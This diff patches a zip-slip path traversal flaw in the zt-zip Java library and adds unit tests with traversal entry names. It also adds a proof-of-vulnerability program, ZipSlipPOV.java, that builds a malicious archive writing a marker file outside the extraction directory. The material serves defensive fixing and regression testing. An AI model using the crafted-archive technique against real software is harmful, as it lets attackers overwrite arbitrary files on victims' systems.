@@ -1,0 +1,353 @@
+diff --git a/src/main/java/org/zeroturnaround/zip/ZipUtil.java b/src/main/java/org/zeroturnaround/zip/ZipUtil.java
+index fa2622a..a676162 100644
+--- a/src/main/java/org/zeroturnaround/zip/ZipUtil.java
++++ b/src/main/java/org/zeroturnaround/zip/ZipUtil.java
+@@ -1131,6 +1131,34 @@ public final class ZipUtil {
+     iterate(is, new Unwraper(outputDir, mapper));
+   }
+ 
++  /**
++   * Resolves {@code name} against {@code outputDir} and verifies that the resulting path is
++   * actually contained within {@code outputDir}, guarding against zip-slip / path traversal
++   * (entry names containing "../" segments, absolute paths, or backslash sequences that would
++   * otherwise let an entry escape the intended destination directory).
++   *
++   * @throws ZipException if the resolved path escapes {@code outputDir}.
++   */
++  static File resolveEntryDestination(File outputDir, String name) throws IOException {
++    return checkEntryDestination(outputDir, new File(outputDir, name), name);
++  }
++
++  /**
++   * Verifies that {@code file} (already resolved relative to some directory nested under
++   * {@code outputDir}) is actually contained within {@code outputDir}. Used by callers that
++   * build up destination paths incrementally (e.g. per path segment).
++   *
++   * @throws ZipException if the resolved path escapes {@code outputDir}.
++   */
++  private static File checkEntryDestination(File outputDir, File file, String name) throws IOException {
++    String canonicalOutputPath = outputDir.getCanonicalPath();
++    String canonicalDestPath = file.getCanonicalPath();
++    if (!canonicalDestPath.equals(canonicalOutputPath) && !canonicalDestPath.startsWith(canonicalOutputPath + File.separator)) {
++      throw new ZipException("Zip entry '" + name + "' is outside of the target directory '" + outputDir + "' (path traversal / zip-slip attempt)");
++    }
++    return file;
++  }
++
+   /**
+    * Unpacks each ZIP entry.
+    *
+@@ -1149,7 +1177,7 @@ public final class ZipUtil {
+     public void process(InputStream in, ZipEntry zipEntry) throws IOException {
+       String name = mapper.map(zipEntry.getName());
+       if (name != null) {
+-        File file = new File(outputDir, name);
++        File file = resolveEntryDestination(outputDir, name);
+         if (zipEntry.isDirectory()) {
+           FileUtils.forceMkdir(file);
+         }
+@@ -1211,18 +1239,18 @@ public final class ZipUtil {
+ 
+           // lets create all the directories and the last entry is the file as EVERY entry is a file
+           for (int i = 0; i < dirs.length - 1; i++) {
+-            File file = new File(parentDirectory, dirs[i]);
++            File file = checkEntryDestination(outputDir, new File(parentDirectory, dirs[i]), name);
+             if (!file.exists()) {
+               FileUtils.forceMkdir(file);
+             }
+             parentDirectory = file;
+           }
+-          File destFile = new File(parentDirectory, dirs[dirs.length - 1]);
++          File destFile = checkEntryDestination(outputDir, new File(parentDirectory, dirs[dirs.length - 1]), name);
+           FileUtils.copy(in, destFile);
+         }
+         // it could be that there are just top level files that the unpacker is used for
+         else {
+-          File destFile = new File(outputDir, name);
++          File destFile = resolveEntryDestination(outputDir, name);
+           FileUtils.copy(in, destFile);
+         }
+       }
+@@ -1257,7 +1285,7 @@ public final class ZipUtil {
+ 
+       String name = mapper.map(getUnrootedName(root, zipEntry.getName()));
+       if (name != null) {
+-        File file = new File(outputDir, name);
++        File file = resolveEntryDestination(outputDir, name);
+         if (zipEntry.isDirectory()) {
+           FileUtils.forceMkdir(file);
+         }
+diff --git a/src/main/java/org/zeroturnaround/zip/Zips.java b/src/main/java/org/zeroturnaround/zip/Zips.java
+index 6d81e19..5291adb 100644
+--- a/src/main/java/org/zeroturnaround/zip/Zips.java
++++ b/src/main/java/org/zeroturnaround/zip/Zips.java
+@@ -680,7 +680,7 @@ public class Zips {
+       }
+       visitedNames.add(entryName);
+ 
+-      File file = new File(destination, entryName);
++      File file = ZipUtil.resolveEntryDestination(destination, entryName);
+       if (zipEntry.isDirectory()) {
+         FileUtils.forceMkdir(file);
+         return;
+diff --git a/src/test/java/org/zeroturnaround/zip/ZipUtilTest.java b/src/test/java/org/zeroturnaround/zip/ZipUtilTest.java
+index c893252..9f9163a 100644
+--- a/src/test/java/org/zeroturnaround/zip/ZipUtilTest.java
++++ b/src/test/java/org/zeroturnaround/zip/ZipUtilTest.java
+@@ -889,4 +889,110 @@ public class ZipUtilTest extends TestCase {
+     file = new File(file, "testFileInTestSubdirectory.txt");
+     assertTrue("The 'testFileInTestSubdirectory.txt' is not a file", file.isFile());
+   }
++
++  private static File createTempDir(String prefix) throws IOException {
++    File dest = File.createTempFile(prefix, null);
++    if (!dest.delete()) {
++      throw new IOException("Could not delete temp file: " + dest.getAbsolutePath());
++    }
++    if (!dest.mkdir()) {
++      throw new IOException("Could not create temp directory: " + dest.getAbsolutePath());
++    }
++    return dest;
++  }
++
++  private static File createZipWithEntry(String entryName, String content) throws IOException {
++    File zip = File.createTempFile("zip-slip-test", ".zip");
++    zip.deleteOnExit();
++    ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip));
++    try {
++      ZipEntry entry = new ZipEntry(entryName);
++      zos.putNextEntry(entry);
++      zos.write(content.getBytes("UTF-8"));
++      zos.closeEntry();
++    }
++    finally {
++      IOUtils.closeQuietly(zos);
++    }
++    return zip;
++  }
++
++  public void testUnpackPreventsZipSlipWithRelativeTraversal() throws IOException {
++    File outputDir = createTempDir("zipSlipUnpackDir");
++    File escapeTarget = new File(outputDir.getParentFile(), "zip-slip-escaped-" + System.identityHashCode(this) + ".txt");
++    escapeTarget.delete();
++    try {
++      File zip = createZipWithEntry("../" + escapeTarget.getName(), "pwned");
++      try {
++        ZipUtil.unpack(zip, outputDir);
++        fail("Expected traversal entry to be rejected");
++      }
++      catch (ZipException expected) {
++        // expected: entry escapes outputDir
++      }
++      assertFalse("Entry must not be written outside of outputDir", escapeTarget.exists());
++    }
++    finally {
++      escapeTarget.delete();
++    }
++  }
++
++  public void testUnpackKeepsAbsolutePathEntryInsideOutputDir() throws IOException {
++    // On this platform, new File(outputDir, absolutePath) is resolved by concatenating
++    // outputDir with the absolute child path rather than discarding outputDir, so an
++    // absolute entry name alone doesn't escape. Guard that this remains true and that
++    // nothing ever lands outside outputDir's canonical path, regardless of resolution details.
++    File outputDir = createTempDir("zipSlipUnpackAbsDir");
++    File escapeTarget = File.createTempFile("zip-slip-abs-escaped", ".txt");
++    assertTrue(escapeTarget.delete());
++    try {
++      File zip = createZipWithEntry(escapeTarget.getAbsolutePath(), "pwned");
++      ZipUtil.unpack(zip, outputDir);
++      assertFalse("Entry must not be written to the absolute path outside of outputDir", escapeTarget.exists());
++    }
++    finally {
++      escapeTarget.delete();
++    }
++  }
++
++  public void testUnwrapPreventsZipSlip() throws IOException {
++    File outputDir = createTempDir("zipSlipUnwrapDir");
++    File escapeTarget = new File(outputDir.getParentFile(), "zip-slip-unwrap-escaped-" + System.identityHashCode(this) + ".txt");
++    escapeTarget.delete();
++    try {
++      // Unwraper strips a single root directory segment before resolving against outputDir.
++      File zip = createZipWithEntry("root/../../" + escapeTarget.getName(), "pwned");
++      try {
++        ZipUtil.unwrap(zip, outputDir);
++        fail("Expected traversal entry to be rejected");
++      }
++      catch (ZipException expected) {
++        // expected: entry escapes outputDir
++      }
++      assertFalse("Entry must not be written outside of outputDir", escapeTarget.exists());
++    }
++    finally {
++      escapeTarget.delete();
++    }
++  }
++
++  public void testBackslashUnpackerPreventsZipSlip() throws IOException {
++    File outputDir = createTempDir("zipSlipBackslashDir");
++    File escapeTarget = new File(outputDir.getParentFile(), "zip-slip-backslash-escaped-" + System.identityHashCode(this) + ".txt");
++    escapeTarget.delete();
++    try {
++      File zip = createZipWithEntry("..\\" + escapeTarget.getName(), "pwned");
++      try {
++        ZipUtil.iterate(zip, new ZipUtil.BackslashUnpacker(outputDir));
++        fail("Expected traversal entry to be rejected");
++      }
++      catch (ZipException expected) {
++        // expected: entry escapes outputDir
++      }
++      assertFalse("Entry must not be written outside of outputDir", escapeTarget.exists());
++    }
++    finally {
++      escapeTarget.delete();
++    }
++  }
+ }
+diff --git a/.security-pipeline/pov/ZipSlipPOV.java b/.security-pipeline/pov/ZipSlipPOV.java
+new file mode 100644
+index 0000000..f7235e7
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPOV.java
+@@ -0,0 +1,140 @@
++import org.zeroturnaround.zip.ZipUtil;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.FileInputStream;
++import java.io.IOException;
++import java.io.InputStream;
++import java.nio.charset.StandardCharsets;
++import java.nio.file.Files;
++import java.nio.file.Path;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (Zip Slip) in
++ * org.zeroturnaround.zip.ZipUtil.
++ *
++ * Root cause: ZipUtil$Unpacker#process (src/main/java/org/zeroturnaround/zip/ZipUtil.java,
++ * around "File file = new File(outputDir, name);" ... "FileUtils.copy(in, file);")
++ * builds the destination file directly from the (mapped) zip entry name without
++ * verifying that the resolved path stays inside outputDir. A zip entry name
++ * containing "../" traversal sequences therefore lets an attacker-controlled
++ * archive write files anywhere the JVM process can write, when extracted via
++ * the public API ZipUtil.unpack(File, File).
++ *
++ * This program:
++ *  1. Builds a malicious zip file (using the plain JDK zip APIs, not ZipUtil,
++ *     since we are attacking the *extraction* side) containing one entry whose
++ *     name is a relative path with enough "../" segments to escape the chosen
++ *     output directory and land on a fixed marker file elsewhere on disk.
++ *  2. Calls the real, public ZipUtil.unpack(File zip, File outputDir) API to
++ *     extract it -- this is the exact vulnerable code path (Unpacker.process).
++ *  3. Checks whether the marker file was written outside the intended output
++ *     directory.
++ *
++ * Exit code 0  => the traversal succeeded (vulnerable behavior reproduced).
++ * Exit code 1  => the traversal was blocked (patched behavior).
++ */
++public class ZipSlipPOV {
++
++  public static void main(String[] args) throws Exception {
++    File tmpRoot = new File(System.getProperty("java.io.tmpdir"));
++
++    // Directory the victim application intends to extract into.
++    File outputDir = new File(tmpRoot, "zipslip-pov-safe-outputdir");
++    deleteRecursively(outputDir);
++    outputDir.mkdirs();
++
++    // Fixed location OUTSIDE outputDir that a correctly-fixed ZipUtil must
++    // never write to. Its parent does not exist yet, exactly like the
++    // scenario the trace goes through (FileUtils.forceMkdir(file.getParentFile())).
++    File escapeMarkerDir = new File(tmpRoot, "zipslip-pov-escaped-marker");
++    deleteRecursively(escapeMarkerDir);
++    File escapeTarget = new File(escapeMarkerDir, "pwned.txt");
++
++    String markerContent = "PWNED-BY-ZIPSLIP-POV";
++
++    // Build the entry name: enough "../" segments to walk from outputDir back
++    // past the filesystem root, followed by the absolute path (minus leading
++    // slash) of escapeTarget. This makes the final resolved location
++    // deterministic regardless of how deep the system temp directory is.
++    int depth = outputDir.getAbsoluteFile().toPath().getNameCount() + 10;
++    StringBuilder traversal = new StringBuilder();
++    for (int i = 0; i < depth; i++) {
++      traversal.append("../");
++    }
++    String escapeAbsPath = escapeTarget.getAbsolutePath().replace(File.separatorChar, '/');
++    if (escapeAbsPath.startsWith("/")) {
++      escapeAbsPath = escapeAbsPath.substring(1);
++    }
++    String maliciousEntryName = traversal.toString() + escapeAbsPath;
++
++    File maliciousZip = new File(tmpRoot, "zipslip-pov.zip");
++    maliciousZip.delete();
++    writeMaliciousZip(maliciousZip, maliciousEntryName, markerContent);
++
++    System.out.println("[pov] malicious zip: " + maliciousZip.getAbsolutePath());
++    System.out.println("[pov] malicious entry name: " + maliciousEntryName);
++    System.out.println("[pov] intended output dir: " + outputDir.getAbsolutePath());
++    System.out.println("[pov] out-of-bounds target: " + escapeTarget.getAbsolutePath());
++
++    try {
++      // This is the real, public vulnerable API call.
++      ZipUtil.unpack(maliciousZip, outputDir);
++    }
++    catch (Exception e) {
++      // A fixed implementation is expected to reject the traversal, possibly
++      // by throwing. We don't fail on the exception itself -- we verify the
++      // actual filesystem effect below, which is the thing that matters.
++      System.out.println("[pov] ZipUtil.unpack threw: " + e);
++    }
++
++    boolean escaped = escapeTarget.isFile() && readFile(escapeTarget).equals(markerContent);
++
++    if (escaped) {
++      System.out.println("[pov] VULNERABLE: entry escaped outputDir and wrote to "
++          + escapeTarget.getAbsolutePath());
++      System.exit(0);
++    }
++    else {
++      System.out.println("[pov] SAFE: no file was written outside of outputDir; "
++          + "path traversal was blocked.");
++      System.exit(1);
++    }
++  }
++
++  private static void writeMaliciousZip(File zipFile, String entryName, String content) throws IOException {
++    try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
++      ZipEntry entry = new ZipEntry(entryName);
++      zos.putNextEntry(entry);
++      zos.write(content.getBytes(StandardCharsets.UTF_8));
++      zos.closeEntry();
++
++      // Also include a benign entry so a naive "archive failed to extract at all"
++      // outcome can't be mistaken for the traversal being blocked.
++      ZipEntry benign = new ZipEntry("safe.txt");
++      zos.putNextEntry(benign);
++      zos.write("benign".getBytes(StandardCharsets.UTF_8));
++      zos.closeEntry();
++    }
++  }
++
++  private static String readFile(File f) throws IOException {
++    byte[] bytes = Files.readAllBytes(f.toPath());
++    return new String(bytes, StandardCharsets.UTF_8);
++  }
++
++  private static void deleteRecursively(File f) {
++    if (f == null || !f.exists()) {
++      return;
++    }
++    File[] children = f.listFiles();
++    if (children != null) {
++      for (File c : children) {
++        deleteRecursively(c);
++      }
++    }
++    f.delete();
++  }
++}
